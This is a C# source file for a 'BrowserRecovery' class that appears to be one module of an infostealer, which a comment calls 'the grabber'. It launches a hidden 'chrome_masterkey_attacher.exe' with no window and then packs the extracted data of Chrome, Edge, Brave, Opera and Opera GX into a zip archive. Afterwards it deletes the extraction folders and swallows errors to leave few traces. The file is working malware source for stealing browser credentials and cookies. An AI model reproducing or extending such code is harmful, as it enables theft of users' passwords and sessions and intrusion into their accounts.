using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace ConsoleApp1
{
    internal class BrowserRecovery
    {
        private static readonly Dictionary<string, string> BrowserMappings = new Dictionary<string, string>
        {
            { "chrome_extract", "Google Chrome" },
            { "edge_extract", "Microsoft Edge" },
            { "brave_extract", "Brave" },
            { "opera_extract", "Opera Stable" },
            { "operagx_extract", "Opera GX" }
        };

        public static void Execute(string zipPath)
        {
            try
            {
                string exeName = "chrome_masterkey_attacher.exe";
                if (!File.Exists(exeName))
                {
                    // If it's not in the current directory, it might be in the same folder as the grabber
                    string altPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exeName);
                    if (File.Exists(altPath))
                    {
                        exeName = altPath;
                    }
                    else
                    {
                        return;
                    }
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = exeName,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(psi))
                {
                    if (process != null)
                    {
                        process.WaitForExit(60000); // 1 minute timeout
                        if (!process.HasExited)
                        {
                            process.Kill();
                        }
                    }
                }

                // After extraction, add files to zip
                using (ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Update))
                {
                    foreach (var mapping in BrowserMappings)
                    {
                        string extractDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, mapping.Key);
                        if (Directory.Exists(extractDir))
                        {
                            AddDirectoryToZip(archive, extractDir, $"browsers/{mapping.Value}");

                            // Cleanup
                            try
                            {
                                Directory.Delete(extractDir, true);
                            }
                            catch { }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Browser recovery error: {ex.Message}");
            }
        }

        private static void AddDirectoryToZip(ZipArchive archive, string sourceDir, string zipEntryPrefix)
        {
            string[] files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
            foreach (string file in files)
            {
                try
                {
                    string relativePath = file.Substring(sourceDir.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                    string entryName = Path.Combine(zipEntryPrefix, relativePath).Replace('\\', '/');

                    archive.CreateEntryFromFile(file, entryName);
                }
                catch { }
            }
        }
    }
}
